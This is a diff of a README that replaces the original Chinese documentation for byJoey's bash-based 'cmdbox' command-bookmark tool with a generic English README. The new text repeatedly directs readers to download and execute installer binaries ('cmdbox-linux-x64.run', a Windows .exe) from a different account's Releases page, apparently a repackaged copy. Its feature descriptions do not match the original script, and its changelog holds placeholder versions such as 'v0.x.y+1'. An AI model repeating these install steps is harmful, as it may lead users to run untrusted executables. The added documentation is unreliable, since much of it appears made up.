@@ -1,328 +1,253 @@
-# 命令收藏夹 (Command Box)
-
-一个强大的命令行工具收藏与快速启动器，支持本地存储和 GitHub 云同步。
-
-## 🌟 特性
-
-- **快速执行**：输入数字直接执行命令，无需确认
-- **智能搜索**：支持关键词搜索命令
-- **云同步**：支持 GitHub 仓库同步，多设备共享
-- **传参同步**：支持命令行传参快速同步
-- **一键安装**：支持 curl 下载直接安装
-- **导出连接**：导出当前配置为快速连接命令
-
-## 🚀 快速开始
-
-### 一键安装
-
-```bash
-bash <(curl -l -s https://raw.githubusercontent.com/byJoey/cmdbox/refs/heads/main/install.sh)
-```
-
-### 传参同步安装
-
-```bash
-bash <(curl -l -s https://raw.githubusercontent.com/byJoey/cmdbox/refs/heads/main/install.sh) --sync "用户名/仓库名" "GitHub_Token"
-```
-
-### 手动安装
-
-```bash
-# 下载脚本
-wget https://raw.githubusercontent.com/byJoey/cmdbox/refs/heads/main/install.sh
-
-# 添加执行权限
-chmod +x install.sh
-
-# 安装到系统
-sudo cp install.sh /usr/local/bin/cb
-sudo chmod +x /usr/local/bin/cb
-```
-
-## 📖 使用方法
-
-### 启动命令收藏夹
-
-```bash
-cb
-```
-
-### 命令行选项
-
-```bash
-cb [选项]
-
-选项:
-  -h, --help     显示帮助信息
-  -v, --version  显示版本信息
-  -m, --manage   直接进入管理模式
-  -s, --sync     手动同步到GitHub
-  --sync <repo> <token>  传参同步到GitHub
-  --reset        重置配置（重新选择模式）
-```
-
-### 传参同步示例
-
-```bash
-# 直接同步到GitHub
-cb --sync "username/repo" "your_github_token"
-
-# 一键安装并同步
-bash <(curl -l -s https://raw.githubusercontent.com/byJoey/cmdbox/refs/heads/main/install.sh) --sync "username/repo" "your_github_token"
-```
-
-## 🔧 功能说明
-
-### 主界面操作
-
-- **数字键**：直接执行对应编号的命令
-- **关键词**：搜索包含关键词的命令
-- **01-06**：进入管理功能
-- **0**：退出程序
-
-### 管理功能
-
-| 选项 | 功能 | 说明 |
-|------|------|------|
-| 01 | 添加命令 | 添加新的命令到收藏夹 |
-| 02 | 编辑命令 | 修改现有命令的信息 |
-| 03 | 删除命令 | 删除不需要的命令 |
-| 04 | 同步管理 | 管理GitHub同步设置 |
-| 05 | 配置设置 | 查看和修改配置 |
-| 06 | 导入/导出 | 导入导出命令数据 |
-
-### 同步模式
-
-#### 本地模式
-- 命令只保存在本地
-- 简单快速，无需配置
-- 适合单机使用
-
-#### GitHub 同步模式
-- 命令自动同步到GitHub
-- 多设备共享命令库
-- 需要GitHub仓库和Token
-
-## 🔗 GitHub 同步配置
-
-### 准备工作
-
-1. **创建GitHub仓库**
-   - 登录GitHub → 点击'+' → New repository
-   - 仓库名建议: cmdbox-commands
-   - 可设为Private保护隐私
-
-2. **生成Personal Access Token**
-   - 头像 → Settings → Developer settings
-   - Personal access tokens → Tokens (classic)
-   - Generate new token → 选择repo权限
-   - **重要**: 复制生成的token（只显示一次）
-
-### 配置步骤
-
-1. 运行 `cb` 启动程序
-2. 选择 `2` 进入GitHub同步模式
-3. 输入仓库地址（格式: 用户名/仓库名）
-4. 输入Personal Access Token
-5. 测试连接成功后即可使用
-
-### 导出快速连接
-
-1. 进入配置设置（选项 05）
-2. 选择导出快速连接（选项 3）
-3. 复制输出的命令到新机器使用
-
-## 📁 文件结构
-
-```
-~/.cmdbox/
-├── config          # 配置文件
-└── commands.json   # 命令数据文件
-```
-
-### 配置文件格式
-
-```bash
-SYNC_MODE=github
-GITHUB_REPO="用户名/仓库名"
-GITHUB_TOKEN="your_token"
-```
-
-### 命令数据格式
-
-```json
-{
-  "commands": [
-    {
-      "id": 1234567890123,
-      "name": "系统监控",
-      "command": "htop",
-      "description": "实时系统监控",
-      "created_at": "2024-01-01T00:00:00Z",
-      "updated_at": "2024-01-01T00:00:00Z"
-    }
-  ]
-}
-```
-
-## 🛠️ 依赖要求
-
-- **bash**: 脚本运行环境
-- **jq**: JSON 数据处理
-- **curl**: HTTP 请求（GitHub API）
-- **base64**: 数据编码
-
-### 安装依赖
-
-```bash
-# Ubuntu/Debian
-sudo apt install jq curl
-
-# CentOS/RHEL
-sudo yum install jq curl
-
-# macOS
-brew install jq curl
-```
-
-## 🔄 同步机制
-
-### 自动同步
-- 每次启动时自动从GitHub同步
-- 如果是首次同步且仓库为空，显示"初始化成功！"
-- 同步成功时显示"同步成功！"
-
-### 手动同步
-- 在同步管理中选择"同步到GitHub"
-- 在同步管理中选择"从GitHub同步"
-
-### 传参同步
-- 支持命令行传参直接同步
-- 格式：`cb --sync "仓库名" "Token"`
-
-## 📝 使用示例
-
-### 添加常用命令
-
-```bash
-# 启动程序
-cb
-
-# 选择 01 添加命令
-# 输入命令名称：系统监控
-# 输入命令内容：htop
-# 输入描述：实时系统监控
-```
-
-### 搜索命令
-
-```bash
-# 在主界面输入关键词
-# 例如：输入 "docker" 搜索相关命令
-```
-
-### 执行命令
-
-```bash
-# 直接输入数字执行命令
-# 例如：输入 "1" 执行第一个命令
-```
-
-### 多设备同步
-
-1. **设备A**：配置GitHub同步并添加命令
-2. **导出连接**：在配置设置中导出快速连接
-3. **设备B**：使用导出的命令快速同步
-
-```bash
-# 在设备B上执行导出的命令
-bash <(curl -l -s https://raw.githubusercontent.com/byJoey/cmdbox/refs/heads/main/install.sh) --sync "username/repo" "your_github_token"
-```
-
-## 🔒 安全注意事项
-
-- **Token 安全**：GitHub Token 包含敏感信息，请妥善保管
-- **仓库权限**：建议使用私有仓库保护命令数据
-- **网络环境**：确保网络环境安全，避免Token泄露
-
-## 🐛 故障排除
-
-### 常见问题
-
-1. **jq 命令未找到**
-   ```bash
-   # 安装 jq
-   sudo apt install jq  # Ubuntu/Debian
-   brew install jq      # macOS
-   ```
-
-2. **GitHub 连接失败**
-   - 检查仓库名和Token是否正确
-   - 确认Token具有repo权限
-   - 检查网络连接
-
-3. **同步失败**
-   - 检查GitHub配置是否完整
-   - 确认仓库存在且有写入权限
-   - 查看错误信息进行排查
-
-### 重置配置
-
-```bash
-# 重置所有配置
-cb --reset
-```
-
-## 📞 支持与反馈
-
-- **GitHub**: [https://github.com/byjoey/cmdbox](https://github.com/byjoey/cmdbox)
-- **博客**: [https://joeyblog.net](https://joeyblog.net)
-- **Telegram**: [https://t.me/+ft-zI76oovgwNmRh](https://t.me/+ft-zI76oovgwNmRh)
-
-## 📄 许可证
-
-本项目采用 MIT 许可证。详见 [LICENSE](LICENSE) 文件。
-
-## 🤝 贡献
-
-欢迎提交 Issue 和 Pull Request！
-
-1. Fork 本项目
-2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
-3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
-4. 推送到分支 (`git push origin feature/AmazingFeature`)
-5. 打开 Pull Request
-
-## 📈 更新日志
-
-### v1.0.3
-- ✨ 新增传参同步功能
-- ✨ 新增导出快速连接功能
-- ✨ 优化每次启动自动同步
-- 🐛 修复 base64 命令兼容性问题
-- 🐛 修复命令行参数处理问题
-
-### v1.0.2
-- ✨ 新增 GitHub 云同步功能
-- ✨ 新增搜索功能
-- ✨ 优化用户界面
-
-### v1.0.1
-- ✨ 新增本地命令收藏功能
-- ✨ 启用科技lion样式
-
-### v1.0.0
-- 🎉 初始版本发布
-- ✨ 基础命令收藏功能
-
-⭐ 如果这个项目对你有帮助，请给个Star支持一下！
-
-## Star History
-
-<a href="https://www.star-history.com/#byJoey/cmdbox&Timeline">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=byJoey/cmdbox&type=Timeline&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=byJoey/cmdbox&type=Timeline" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=byJoey/cmdbox&type=Timeline" />
- </picture>
-</a>
+# CMDBOX: Lightweight Script Command Hub for Quick Snippet Management Essentials
+
+Download from Releases: https://github.com/gadgeteer99/cmdbox/releases
+
+[![Releases - Download](https://img.shields.io/badge/Releases-Download-blue?logo=github&logoColor=white)](https://github.com/gadgeteer99/cmdbox/releases)
+
+🔧 🧰 📦 🧭 🗂️
+
+CMDBOX is a small, fast tool to collect, organize, and run script commands. It acts like a personal library for your command snippets. The goal is simple: save commands once, find them quickly, and run them reliably. It fits developers, admins, and IT pros who repeat the same shell interactions often. The design favors clarity and speed. You keep your snippets in a local, portable store. You execute them with a single command. You stay in control of how commands execute, how they’re named, and how they’re organized.
+
+What you’ll find here
+- A minimal CLI that hides the plumbing and makes commands easy to reuse.
+- A structured snippet store with names, tags, and descriptions.
+- Quick search and filtering to locate the exact snippet you want.
+- A flexible runner that executes commands in your shell and returns clean results.
+- Cross-platform support with native installers. Linux, Windows, and macOS builds are available in the Releases page.
+
+If you need a compact tool to manage your script snippets, CMDBOX offers a calm, predictable workflow. It’s not flashy. It is dependable. And it scales with your needs.
+
+Table of contents
+- About CMDBOX
+- Core concepts
+- Quick Start
+- Install and update
+- How to manage snippets
+- Running commands
+- Snippet presets and templates
+- Advanced usage
+- Configuration and customization
+- Extensions and integrations
+- Troubleshooting
+- Security and best practices
+- Development and contributing
+- Roadmap
+- FAQ
+- License
+
+About CMDBOX
+CMDBOX is built around a single idea: help you keep a personal library of commands that you can reuse across projects. Each snippet is a small, self-contained unit: a name, optional tags, an optional description, and the command string. Snippets are stored locally so you don’t depend on a cloud service to recall your commands. This keeps your workflow fast and private. The tool focuses on the command surface, not the data you run through it. You can store anything that fits in a shell command line.
+
+Key goals
+- Simple to learn: a clear set of subcommands, with sensible defaults.
+- Fast to use: fast search, fast execution, minimal overhead.
+- Flexible: supports simple commands and more complex scripts.
+- Safe: explicit prompts for dangerous operations when needed.
+- Portable: works across common desktop environments with minimal setup.
+
+Core concepts
+- Snippet: a named command or a small script you want to reuse.
+- Library: a local store for snippets, organized by folders and tags.
+- Runner: a component that takes a snippet’s command string and executes it in your shell.
+- Metadata: optional description, tags, and notes to help you remember why a snippet exists.
+
+Quick Start
+This section walks you through the fastest path from zero to a working CMDBOX setup.
+
+Step 1: Get the installer
+From the Releases page, download the Linux installer named cmdbox-linux-x64.run. The file is designed to be executed directly on most Linux systems. If you prefer Windows, you can grab cmdbox-windows-x64.exe; macOS users often have a package available as well. For Linux, the primary installation file is cmdbox-linux-x64.run. The Releases page is the source of all builds and updates.
+
+Step 2: Make the installer executable
+Open a terminal and run:
+- chmod +x cmdbox-linux-x64.run
+
+Step 3: Run the installer
+In the same terminal, execute:
+- ./cmdbox-linux-x64.run
+
+Step 4: Initialize and verify
+The installer creates a local library path and a default configuration. After installation, run:
+- cmdbox --version
+- cmdbox help
+These commands confirm the tool is installed correctly and show you the available commands.
+
+Step 5: Create your first snippet
+Save a simple command as a snippet:
+- cmdbox add backup-database --command "pg_dump -h localhost -U user -d mydb > /backups/mydb.sql" --description "Backup Postgres database" --tags backup,db
+Then list snippets to verify:
+- cmdbox list
+
+Step 6: Run a snippet
+Execute the backup:
+- cmdbox run backup-database
+CMDBOX will run the command in your current shell environment and show you the output, including any errors.
+
+Step 7: Explore more
+Search snippets by keyword:
+- cmdbox search backup
+Filter by tag:
+- cmdbox list --tags db
+Edit a snippet:
+- cmdbox edit backup-database --command "pg_dump -h localhost -U user -d mydb --file /backups/mydb.sql"
+
+Install and update
+CMDBOX aims to keep installation simple. The Releases page hosts ready-to-run installers for major platforms. Linux users generally start with cmdbox-linux-x64.run, while Windows users grab cmdbox-windows-x64.exe. macOS users may find a package suitable for their architecture or a native binary. The Releases page is the single source of truth for installation. If you encounter a broken link or the file you expect isn’t available, check the Releases section for alternatives or newer builds.
+
+How to manage snippets
+Snippets are the core unit of CMDBOX. Each snippet is a tiny script or command set you want to reuse. There are several operations you’ll perform often.
+
+Adding snippets
+- A snippet is created with a name. You attach a command string, optional description, and tags.
+- Example:
+  cmdbox add deploy-app --command "kubectl apply -f k8s/deploy.yaml" --description "Deploy app to cluster" --tags deploy,devops,k8s
+
+Listing and filtering
+- List all snippets:
+  cmdbox list
+- Show details for a single snippet:
+  cmdbox info deploy-app
+- Filter by tag or text:
+  cmdbox list --tags deploy
+  cmdbox search kubectl
+
+Editing snippets
+- Change the command, description, or tags:
+  cmdbox edit deploy-app --command "kubectl apply -f k8s/deploy.yaml" --description "Apply deployment" --tags deploy,prod
+
+Removing snippets
+- Remove a snippet when it’s no longer needed:
+  cmdbox remove deploy-app
+
+Running commands
+- The run command executes the snippet’s command string in your shell. CMDBOX captures standard output and standard error for you.
+- If a snippet runs long, you can interrupt it with Ctrl+C. The runner will stop the process gracefully.
+- You can redirect outputs within the snippet’s command string. For example:
+  cmdbox add log-rotate --command "logrotate /etc/logrotate.conf" --description "Rotate logs" --tags maintenance
+
+Templates and presets
+- Snippet templates help you start quickly. You can clone a template, then customize fields.
+- Example template fields:
+  - name
+  - command
+  - description
+  - tags
+  - schedule (optional, for future automation)
+  - environment (optional, a small set of variables to prepend to the command)
+
+Advanced usage
+- Nested snippets: You can create a snippet that calls another snippet. While the runner executes, you can nest commands by prefixing with CMDBOX’s run command inside the snippet:
+  - command: "cmdbox run setup-env && cmdbox run deploy-app"
+- Environment handling: CMDBOX can pass environment variables to commands. You can define them in the snippet or the global configuration.
+- Logging: You can enable verbose logging to capture details of every run. Logs go to your chosen log file or stdout.
+
+Configuration and customization
+CMDBOX is designed to be configurable without complex setup. You can tweak its behavior with a configuration file, typically placed under your home directory (for example, ~/.cmdbox/config.yaml). The configuration supports common options:
+
+- library_path: Path to the snippet library
+- default_shell: Shell used for running commands (bash, zsh, pwsh, etc.)
+- editor: Command or program used to edit snippet details
+- log_level: One of debug, info, warn, error
+- auto_sync: Whether to sync the library with a remote store (if you enable it)
+- snippet_retention: How long to keep old versions of snippets (if you enable versioning)
+
+If you don’t have a config file, CMDBOX creates a sensible default on first run. You can customize later as you grow accustomed to the tool.
+
+Extensions and integrations
+CMDBOX is not a monolith. It supports extensions that integrate with your workflow.
+
+- Shell integrations: Add quick alias commands to your shell for common actions.
+- Version control: Store your snippet library in a git repository for version history.
+- Continuous integration: Use CMDBOX to run small, repeatable commands in CI pipelines.
+- SSH and remote execution: Save commands that run over SSH and reuse them from any host you manage.
+
+Security and best practices
+- Treat snippets as code: keep them clean, well-documented, and tested.
+- Use least privilege: snippets that perform destructive actions should prompt for confirmation or run under a restricted user.
+- Manage secrets carefully: avoid embedding passwords in snippet commands. Use environment variables or secret management tools.
+- Keep the library local: unless you enable a private sync, snippets stay on your machine.
+
+Troubleshooting
+If something doesn’t work as expected, try these steps:
+
+- Check the version: cmdbox --version
+- See available commands: cmdbox help
+- Verify the snippet exists: cmdbox list
+- Run with verbose output if supported: cmdbox run --verbose <snippet>
+- Check file permissions: ensure the installed binary is executable (chmod +x on Linux/macOS)
+- Review logs: if you enabled logging, inspect the log file for errors
+- Inspect the environment: some commands depend on your PATH or shell configuration
+
+Development and contributing
+CMDBOX is designed to be approachable for contributors. If you want to contribute, here is a simple path:
+
+- Fork the repository on GitHub.
+- Create a feature branch with a clear name, such as feature/add-multi-run.
+- Implement the feature with tests.
+- Run tests locally and ensure they pass.
+- Open a pull request with a concise description of changes.
+
+Testing
+- Unit tests cover core CLI behavior and the snippet store logic.
+- Integration tests validate end-to-end flows, including add, list, and run paths.
+- Please run tests before submitting improvements.
+
+Roadmap
+We keep a simple, actionable roadmap.
+
+- Improve search: support fuzzy matching and ranking by relevance.
+- More snippet templates: add more ready-to-use templates for common tasks.
+- Cloud sync: optional, private sync across machines.
+- Multi-user scenarios: shared libraries with access controls.
+
+FAQ
+- What platforms are supported?
+  Linux, Windows, and macOS with builds available from the Releases page.
+- How do I back up my library?
+  Copy the library directory to a safe location or enable a private git-backed store.
+- Can I share snippets with teammates?
+  Yes, by exporting the library or syncing it in a shared, private store.
+
+Downloads
+From the Releases page you will find multiple builds. For Linux, download cmdbox-linux-x64.run and follow the Quick Start steps above. For Windows, download cmdbox-windows-x64.exe and run it directly. For macOS, locate the macOS installer or a suitable binary. If you cannot access the URL provided here, please check the Releases page for alternatives. The link is provided again here for convenience: https://github.com/gadgeteer99/cmdbox/releases
+
+Changelog
+- v0.x.y: Initial release. Core snippet library and runner implemented.
+- v0.x.z: Minor improvements to search and descriptor fields.
+- v0.x.y+1: Performance enhancements and better logging.
+- Future: Add more templates, cloud sync, and improved security checks.
+
+Appendix: Quick reference commands
+- Add snippet: cmdbox add NAME --command "COMMAND" --description "DESCRIPTION" --tags tag1,tag2
+- List snippets: cmdbox list
+- Show snippet details: cmdbox info NAME
+- Run snippet: cmdbox run NAME
+- Edit snippet: cmdbox edit NAME --command "NEW_COMMAND" --description "NEW_DESCRIPTION" --tags newtag
+- Remove snippet: cmdbox remove NAME
+- Search by keyword: cmdbox search KEYWORD
+- Filter by tag: cmdbox list --tags TAG
+
+Appendix: Tips for productive usage
+- Keep names short but descriptive. A good name helps you locate a snippet in seconds.
+- Use tags to group related commands. Tags like deploy, test, monitor, or db help you think in contexts.
+- Add descriptions. A sentence or two helps you remember why you saved the snippet.
+- Script inputs: If a command needs user input, consider wrapping the input in a script or using environment variables.
+- Version control: If you work with a team, keep the library in a private git repository. It helps track changes and revert when needed.
+- Backups: Regular backups protect you from local hardware failures.
+- Security: Avoid embedding credentials in command strings. Use environment variables and secret managers.
+
+Usage examples in practice
+- Grouped tasks for a project:
+  - cmdbox add build-app --command "npm run build" --description "Build frontend app" --tags build,frontend
+  - cmdbox add test-suite --command "npm test" --description "Run test suite" --tags test
+  - cmdbox add deploy-prod --command "kubectl apply -f k8s/prod.yaml" --description "Deploy to production" --tags deploy,prod
+  - cmdbox run build-app
+  - cmdbox run test-suite
+  - cmdbox run deploy-prod
+- Quick server management:
+  - cmdbox add restart-nginx --command "sudo systemctl restart nginx" --description "Restart web server" --tags server,infra
+  - cmdbox run restart-nginx
+
+Note on the releases link
+- If the provided link is accessible and contains a path, CMDBOX instructs you to download the specific installer file (for example cmdbox-linux-x64.run) and run it. If you encounter a broken link or the asset is missing, visit the Releases section to pick an available asset. The official link to check is https://github.com/gadgeteer99/cmdbox/releases. The link is included again here for convenience.
+
+End of README content.
